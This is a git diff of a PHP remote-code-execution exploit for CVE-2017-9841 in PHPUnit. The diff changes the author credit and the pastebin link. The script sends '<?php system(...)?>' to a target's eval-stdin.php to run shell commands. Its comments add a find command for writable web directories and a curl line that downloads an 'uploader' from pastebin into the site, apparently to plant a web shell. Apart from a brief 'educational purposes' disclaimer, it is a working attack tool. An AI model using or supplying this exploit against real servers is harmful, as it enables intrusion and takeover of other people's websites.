@@ -2,9 +2,9 @@
 
 /**
  * PHPunit RCE Exploiter
- * Coded By Hexocrypt
+ * Coded By trhacknon
  * CVE : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9841
- * Github : https://github.com/hexocrypt
+ * Github : https://github.com/trhacknon 
  * Disclaimer: This code is for educational purposes only.
  */
 
@@ -14,7 +14,7 @@ $path ="https://target/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php";
 
 $command = "uname -a";
 //find writable directory : find /var/www/html/ -type d -perm -o+w
-//get uploader : curl -s https://pastebin.com/raw/f4xQX4sL -o zzzz.php
+//get uploader : curl -s https://pastebin.com/raw/66jXNYna -o uprcephpunit.php
 $data = "<?php system('$command');?>" ;
 
 $ch = curl_init();
